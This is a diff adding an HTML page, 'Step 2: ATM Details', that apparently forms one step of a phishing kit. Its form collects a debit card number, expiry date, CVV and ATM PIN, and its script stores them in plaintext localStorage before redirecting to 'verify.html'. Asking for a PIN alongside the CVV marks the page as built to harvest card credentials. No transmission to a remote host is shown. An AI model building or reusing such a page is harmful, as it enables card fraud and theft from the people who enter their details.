@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Step 2 - ATM Details</title>
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:#0d1b2a;
+padding:20px;
+color:#fff;
+}
+
+.container{
+max-width:420px;
+margin:auto;
+background:#1b263b;
+padding:20px;
+border-radius:18px;
+box-shadow:0 0 20px rgba(0,0,0,.35);
+}
+
+h1{
+color:#8b5cf6;
+margin-bottom:25px;
+}
+
+label{
+display:block;
+margin-top:18px;
+margin-bottom:8px;
+font-size:16px;
+font-weight:bold;
+}
+
+input{
+width:100%;
+padding:14px;
+border-radius:12px;
+border:2px solid #34495e;
+background:#0f172a;
+color:#fff;
+font-size:16px;
+outline:none;
+}
+
+input:focus{
+border-color:#8b5cf6;
+}
+
+button{
+width:100%;
+margin-top:30px;
+padding:15px;
+background:#16a34a;
+border:none;
+border-radius:12px;
+font-size:18px;
+font-weight:bold;
+color:#fff;
+cursor:pointer;
+}
+
+.popupOverlay{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.65);
+justify-content:center;
+align-items:center;
+backdrop-filter:blur(5px);
+z-index:9999;
+}
+
+.popupBox{
+width:90%;
+max-width:340px;
+background:#1d2438;
+padding:25px;
+border-radius:18px;
+text-align:center;
+}
+
+.popupIcon{
+width:70px;
+height:70px;
+margin:auto;
+margin-bottom:15px;
+background:#ff9800;
+border-radius:50%;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:36px;
+font-weight:bold;
+color:#fff;
+}
+
+.popupBox h2{
+margin-bottom:10px;
+}
+
+.popupBox p{
+margin-bottom:20px;
+color:#ddd;
+}
+
+.popupBox button{
+margin-top:0;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<h1>💳 Step 2: ATM Details</h1>
+
+<label>ATM / Debit Card Number</label>
+<input type="text" id="cardNumber" placeholder="Enter Card Number">
+
+<label>Expiry Date (MM/YY)</label>
+<input type="text" id="expiry" placeholder="MM/YY">
+
+<label>CVV</label>
+<input type="password" id="cvv" placeholder="Enter CVV">
+
+<label>ATM PIN (4-6 digits)</label>
+<input type="password" id="pin" placeholder="Enter ATM PIN">
+
+<button onclick="saveATM()">Continue</button>
+
+</div>
+
+<div id="fillPopup" class="popupOverlay">
+
+<div class="popupBox">
+
+<div class="popupIcon">!</div>
+
+<h2>Incomplete Details</h2>
+
+<p>Please fill all ATM details before continuing.</p>
+
+<button onclick="closeFillPopup()">OK</button>
+
+</div>
+
+</div>
+
+<script>
+
+function saveATM(){
+
+let card=document.getElementById("cardNumber").value.trim();
+let expiry=document.getElementById("expiry").value.trim();
+let cvv=document.getElementById("cvv").value.trim();
+let pin=document.getElementById("pin").value.trim();
+
+if(card==""||expiry==""||cvv==""||pin==""){
+
+document.getElementById("fillPopup").style.display="flex";
+return;
+
+}
+
+localStorage.setItem("cardNumber",card);
+localStorage.setItem("expiry",expiry);
+localStorage.setItem("cvv",cvv);
+localStorage.setItem("pin",pin);
+
+window.location.href="verify.html";
+
+}
+
+function closeFillPopup(){
+
+document.getElementById("fillPopup").style.display="none";
+
+}
+
+</script>
+
+</body>
+  </html>
